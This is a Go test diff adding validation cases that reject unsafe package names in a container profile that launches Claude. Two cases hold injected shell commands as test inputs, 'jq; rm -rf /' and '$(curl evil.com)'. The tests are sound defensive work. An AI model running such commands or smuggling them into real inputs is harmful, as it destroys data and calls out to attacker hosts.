@@ -291,6 +291,41 @@ func TestValidate(t *testing.T) {
 			wantErr: "packages is only valid with environment: container",
 		},
 		{
+			name: "invalid package name with semicolon",
+			profile: Profile{
+				Environment: EnvironmentContainer,
+				Launch:      LaunchClaude,
+				Packages:    []string{"jq; rm -rf /"},
+			},
+			wantErr: "invalid package name",
+		},
+		{
+			name: "invalid package name with shell expansion",
+			profile: Profile{
+				Environment: EnvironmentContainer,
+				Launch:      LaunchClaude,
+				Packages:    []string{"$(curl evil.com)"},
+			},
+			wantErr: "invalid package name",
+		},
+		{
+			name: "invalid package name with spaces",
+			profile: Profile{
+				Environment: EnvironmentContainer,
+				Launch:      LaunchClaude,
+				Packages:    []string{"jq tree"},
+			},
+			wantErr: "invalid package name",
+		},
+		{
+			name: "valid package with version specifier",
+			profile: Profile{
+				Environment: EnvironmentContainer,
+				Launch:      LaunchClaude,
+				Packages:    []string{"python3-pip", "libssl-dev", "gcc-12"},
+			},
+		},
+		{
 			name: "valid auth config",
 			profile: Profile{
 				Environment: EnvironmentContainer,
